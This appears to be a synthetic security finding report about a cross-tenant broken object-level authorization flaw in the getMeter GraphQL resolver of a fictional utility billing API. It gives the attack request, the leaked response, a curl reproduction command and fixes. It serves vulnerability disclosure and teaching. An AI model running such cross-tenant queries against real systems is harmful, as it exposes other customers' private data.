# Security Analysis Report
**System:** PowerGrid Customer Billing API
**Domain:** Energy / Utilities / Smart Grid
**Example ID:** GQL-0314
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.7 | Nested resource access without parent authorization on `getMeter` — attacker accesses cross-tenant smart meter records including nested child readings |

---

## Finding 1 — BOLA: Nested Resources Without Parent Authorization (Pattern 1.7)

### Summary
The `getMeter` resolver on PowerGrid Customer Billing API (`api.powergrid-customer-b.example.com`) fetches by `meterId` only without verifying the fetched object's `tenantId` against the JWT's `tenantId` (RISK-GQL-314). Per §5.0 Pattern 1.7, the resolver does not enforce ownership or tenancy boundaries on the parent meter object or its nested child resources (readings). An attacker using `tenant-1f71` token accesses smart meter records belonging to `tenant-6060`, including all nested `readings` relationships.

**HAR/response key consistency:** HAR query uses `getMeter`, and the response key is also `getMeter` — consistent, no naming conflict.

**Redis cache vulnerability:** Cache is keyed by `meterId` only (no user/tenant dimension), enabling cross-tenant cache poisoning of energy billing and consumption data.

**Pattern:** 1.7 — Nested resources without parent authorization (BOLA)
**Affected resolver:** `getMeter`
**Affected endpoint:** `POST https://api.powergrid-customer-b.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.powergrid-customer-b.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-1f71

{"query": "query VulnerableOp { getMeter(id: \"M-2314\") { meterId tenantId ownerId data { sensitiveField internalNotes } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Meter Record Returned (cross-tenant)**
```json
{
  "data": {
    "getMeter": {
      "tenantId": "tenant-6060",
      "ownerId": "other-user-1f716060",
      "data": {
        "sensitiveField": "CONFIDENTIAL-1f716060",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-1f71`. Returned data belongs to: `tenant-6060`. Cross-tenant energy meter data access confirmed.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.powergrid-customer-b.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-1f71" \
  -d '{"query": "query VulnerableOp { getMeter(id: \"M-2314\") { meterId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: data.getMeter.tenantId == "tenant-6060" (different from JWT tenant-1f71)
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `getMeter` resolver: assert `fetched.tenantId === jwt.tenantId` post-fetch. Return 403 on mismatch.
2. Enforce tenancy at each nested level — `readings` resolver must re-validate authorization against the parent meter's `tenantId`.
3. Re-key Redis cache to include `tenantId`.
